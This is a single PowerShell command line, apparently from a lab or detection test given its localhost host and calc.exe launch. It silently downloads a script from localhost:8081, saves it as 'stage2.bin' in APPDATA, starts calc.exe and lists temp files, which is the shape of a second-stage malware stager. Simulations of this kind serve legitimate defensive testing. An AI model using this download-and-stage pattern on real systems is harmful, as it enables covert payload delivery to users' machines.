
Invoke-WebRequest -Uri "http://localhost:8081/updater.ps1" -OutFile "$env:APPDATA\stage2.bin" -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
